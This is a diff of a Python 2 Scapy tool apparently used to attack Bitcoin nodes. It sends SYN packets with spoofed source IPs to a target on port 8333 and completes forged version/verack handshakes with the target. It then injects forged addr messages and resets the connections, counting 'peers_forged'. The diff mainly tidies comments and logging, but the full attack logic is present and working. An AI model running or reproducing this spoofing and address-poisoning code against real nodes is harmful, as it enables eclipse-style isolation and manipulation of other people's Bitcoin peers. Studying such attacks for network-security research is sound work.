@@ -18,16 +18,15 @@ class Sniff_And_Respond(threading.Thread):
 
         super(Sniff_And_Respond, s).__init__()
 
-
     # Bitcoin utility functions
     def btc_add_magic(s, pkt):
         b = list(pkt.to_bytes())
-
+        # Workaround for a bug in testnet magic in some bitcoin-lib versions
+        #   uncomment if testnet packets are being dropped.
         # b[0] = b'\x0b'
         # b[1] = b'\x11'
         # b[2] = b'\x09'
         # b[3] = b'\x07'
-
         return ''.join(b)
 
     def btc_addr_pkt(s, str_addrs):
@@ -36,7 +35,7 @@ class Sniff_And_Respond(threading.Thread):
         for i in str_addrs:
             addr = CAddress()
             addr.port = s.dport
-            addr.nTime = int(time.time()) #- timefloor + replacementtimefloor
+            addr.nTime = int(time.time())
             addr.ip = i
             addrs.append( addr )
 
@@ -59,25 +58,20 @@ class Sniff_And_Respond(threading.Thread):
     def btc_verack_pkt(s):
         return s.btc_add_magic(msg_verack())
 
-
     def respond(s, pkt):
         target_ip = s.target_ip
         PORT = s.dport
         RESP_PORT = s.sport
 
-        start = time.time()
-
         if pkt[IP].src == s.target_ip:
             with s.connections.lock:
                 if pkt[IP].dst in s.connections:
-                    print "pkt[IP].dst", pkt[IP].dst, s.connections[ pkt[IP].dst ], pkt[TCP].flags
 
                     # This packet is both from the target and intented for us.                
                     if pkt[TCP].flags == 0x12 and s.connections[ pkt[IP].dst ] == "sent": #SYNACK received
-                        #TCP connection established 
+                        # TCP connection established 
 
-                        #Send version pkt #should this seqence number increase by the size of the previous pkt??
-                        #combine the ack to the syn-ack with a pshm yeah!
+                        # To save sending an additional pkt we combine the ack the syn-ack with a psh-ack of the version pkt.
                         p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=pkt.seq+1,seq=pkt.ack)/s.btc_version_pkt(pkt[IP].dst)
                         send(p, verbose=False)
 
@@ -92,7 +86,6 @@ class Sniff_And_Respond(threading.Thread):
                         payload = pkt[TCP].payload.load
 
                         if payload[4:11] == "version" and s.connections[pkt[IP].dst] == "synack":
-
                             s.connections[pkt[IP].dst] = "version"
 
                             if len( s.ips[pkt[IP].dst] ) == 0:
@@ -104,11 +97,9 @@ class Sniff_And_Respond(threading.Thread):
                                 p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=(pkt.seq+len(payload)),seq=pkt.ack)/s.btc_verack_pkt()
                                 send(p, verbose=False)
 
-
                         elif payload[4:10] == "verack" and s.connections[pkt[IP].dst] == "version": 
                             # verack received we are connected 
                             print "done"
-
                             s.connections[pkt[IP].dst] = "done"
 
                             if len( s.ips[pkt[IP].dst] ) > 0:
@@ -116,14 +107,12 @@ class Sniff_And_Respond(threading.Thread):
                                 addrs = s.btc_addr_pkt(s.ips[pkt[IP].dst])
                                 p= IP(dst=target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=(pkt.seq+len(payload)),seq=pkt.ack)/addrs
                                 send(p, verbose=False)
-
                                 s.peers_forged+=1
                                 print s.peers_forged, pkt[IP].dst
                                 time.sleep(4)
 
                                 p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='R',seq=pkt.ack+len(s.btc_addr_pkt(s.ips[pkt[IP].dst])))
                                 send(p, verbose=False)
-
                             else:
                                 p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='AR',ack=(pkt.seq+len(payload)),seq=pkt.ack)
                                 send(p, verbose=False)
@@ -133,8 +122,6 @@ class Sniff_And_Respond(threading.Thread):
             prn=s.respond, 
             filter="tcp and host "+s.target_ip+" and port 8333", 
             store=0)
-
-
 
 class ConnectionInitiator:
      def __init__(s, iface, target_ip, dport, sport, ips, connections):
@@ -149,6 +136,7 @@ class ConnectionInitiator:
         ip_index = 0
         new_index = 0
         tried_index = 0
+        time_between_new_connections = 3 #in seconds
 
         tried = []
         new = []
@@ -160,46 +148,34 @@ class ConnectionInitiator:
                 new.append(ip)
 
         ratio = len(tried)/len(new)
-
         if ratio == 1: ratio = 2
-
-        print ratio, len(tried), len(new)
+        print "Tried/New addr ratio is", ratio, len(tried), len(new)
 
         while True:
-
-            spoofed_ip = s.ips.keys()[ip_index % len(s.ips) ]
-
-            if  len(tried) == 0 or ip_index % ratio == 0 :
-                spoofed_ip = new[new_index % len(new) ]
+            spoofed_ip = s.ips.keys()[ip_index % len(s.ips)]
+            if  len(tried) == 0 or ip_index % ratio == 0:
+                spoofed_ip = new[new_index % len(new)]
                 new_index+=1
             else:
-                spoofed_ip = tried[tried_index % len(tried) ]
+                spoofed_ip = tried[tried_index % len(tried)]
                 tried_index+=1
 
             seq = random.randrange(0, 2**32)
 
-
-            p=IP(dst=s.target_ip,src=spoofed_ip)/TCP(dport=s.dport,sport=s.sport,flags='S',seq=seq )
-
-
-            send(p, verbose=True, iface=s.iface) # doesn't work if this is set to loopback
+            p=IP(dst=s.target_ip,src=spoofed_ip)/TCP(dport=s.dport,sport=s.sport,flags='S',seq=seq)
+            send(p, verbose=True, iface=s.iface) # doesn't work if iface is set to loopback
             # iface must be set to current internet connection
 
-            with s.connections.lock:
-                s.connections[spoofed_ip] = "sent"
+            with s.connections.lock: s.connections[spoofed_ip] = "sent"
 
-
-            LAST_PACKET_SENT = int(time.time()*1000) 
-            stop = time.time()
-
-            print spoofed_ip, ip_index, time.time()
-
+            print "Initiated peer connection from ip", spoofed_ip, "index", ip_index, "at", time.time()
             ip_index+=1
+            time.sleep(time_between_new_connections)
 
-            #time.sleep(0.2)
-            time.sleep(3)
-
-# Setup Rawsockets in scapy
+# Setup Rawsockets in scapy, neccessary if loopback is being used with scapy.
+#  See 'I can’t ping 127.0.0.1. Scapy does not work with 127.0.0.1 or on the 
+#  loopback interface' on the scapy faq at
+#  http://www.secdev.org/projects/scapy/doc/troubleshooting.html
 conf.L3socket = L3RawSocket
 
 # TODO: parameterize
